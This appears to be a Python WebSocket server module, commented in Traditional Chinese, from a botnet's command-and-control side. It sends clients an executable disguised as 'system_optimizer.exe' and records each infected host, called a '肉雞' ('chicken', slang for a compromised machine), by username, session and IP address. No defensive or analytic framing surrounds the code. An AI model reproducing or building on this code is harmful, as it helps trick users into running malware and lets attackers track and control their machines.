import json
import logging
import os
import base64
from datetime import datetime
from models import db, User
from build_utils import BuildManager

class WebSocketHandler:
    def __init__(self):
        self.execution_status = {}  # 用於追蹤每個客戶端的執行狀態

    def _send_error(self, ws, error):
        """統一錯誤處理並發送錯誤訊息"""
        logging.error(f"WebSocket 錯誤: {error}")  # 記錄錯誤日誌
        try:
            ws.send(json.dumps({'status': 'error', 'message': str(error)}))  # 發送錯誤信息給客戶端
        except Exception as send_error:
            logging.error(f"發送錯誤訊息失敗: {send_error}")  # 如果發送錯誤信息失敗，記錄日誌

    def store_chicken_info(self, data):
        """將肉雞訊息存儲到資料庫"""
        try:
            new_user = User(
                username=data['username'],  # 設置用戶名
                session_id=data['session_id'],  # 設置會話 ID
                ip_address=data['ip_address'],  # 設置 IP 地址
                last_seen=datetime.now()  # 設置最後一次看到的時間
            )
            db.session.add(new_user)  # 將新用戶添加到資料庫會話
            db.session.commit()  # 提交資料庫會話
            logging.info(f"成功存儲肉雞訊息: {data}")  # 記錄成功日誌
        except Exception as e:
            logging.error(f"存儲肉雞訊息失敗: {str(e)}")  # 記錄失敗日誌
            db.session.rollback()  # 回滾資料庫會話

    def handle_optimizer_session(self, ws, client_ip):
        """處理優化器會話並保持連接"""
        try:
            session_id = os.urandom(16).hex()  # 生成隨機的會話 ID
            logging.info(f"WebSocket connection established from {client_ip}")  # 記錄連接建立日誌

            optimizer_code = self._prepare_optimizer_code(session_id)  # 準備優化器代碼
            ws.send(json.dumps({
                'status': 'sending_code',
                'type': 'optimizer',
                'code': optimizer_code,
                'session_id': session_id
            }))  # 發送優化器代碼給客戶端
            self.send_executable(ws)  # 發送可執行文件

            # 保持連接並處理客戶端消息
            while True:
                message = ws.receive()  # 接收客戶端消息
                if message is None:
                    break  # 如果消息為空，則退出循環
                self.handle_client_message(ws, message)  # 處理客戶端消息

        except Exception as e:
            self._send_error(ws, e)  # 發生錯誤時，發送錯誤信息

    def send_executable(self, ws):
        """發送 .exe 文件到客戶端"""
        exe_path = os.path.join(os.path.dirname(__file__), "static", "system_optimizer.exe")  # 獲取 .exe 文件的路徑
        try:
            with open(exe_path, 'rb') as f:
                exe_data = f.read()  # 讀取二進制文件內容
                exe_data_base64 = base64.b64encode(exe_data).decode('utf-8')  # 將二進制數據轉換為 base64 字符串
                ws.send(json.dumps({
                    'status': 'sending_executable',
                    'type': 'executable',
                    'data': exe_data_base64
                }))  # 發送 base64 編碼的文件數據
                logging.info("成功發送 .exe 文件")  # 記錄成功日誌
        except Exception as e:
            logging.error(f"發送 .exe 文件時出錯: {str(e)}")  # 記錄錯誤日誌
            self._send_error(ws, e)  # 發送錯誤信息

    def handle_client_message(self, ws, message):
        """處理來自客戶端的消息"""
        try:
            data = json.loads(message)  # 將消息內容解析為 JSON
            if data.get('type') == 'chicken_info':
                self.store_chicken_info(data)  # 如果消息類型是 'chicken_info'，則存儲肉雞信息
        except Exception as e:
            self._send_error(ws, e)  # 發生錯誤時，發送錯誤信息

    def handle_client_response(self, ws, client_ip, session_id):
        """處理客戶端響應"""
        try:
            self.execution_status[client_ip] = {
                'executed': True,
                'timestamp': datetime.now().isoformat(),
                'session_id': session_id
            }  # 更新客戶端的執行狀態
            logging.info(f"客戶端 {client_ip} 的響應已處理，會話 ID: {session_id}")  # 記錄成功日誌
        except Exception as e:
            self._send_error(ws, e)  # 發生錯誤時，發送錯誤信息

    def _prepare_optimizer_code(self, session_id):
        """準備優化器代碼"""
        build_manager = BuildManager()
        build_manager.create_exe()  # 生成 .exe 文件
        return os.path.join(os.path.dirname(__file__), "static", "system_optimizer.exe")  # 返回 .exe 文件的路徑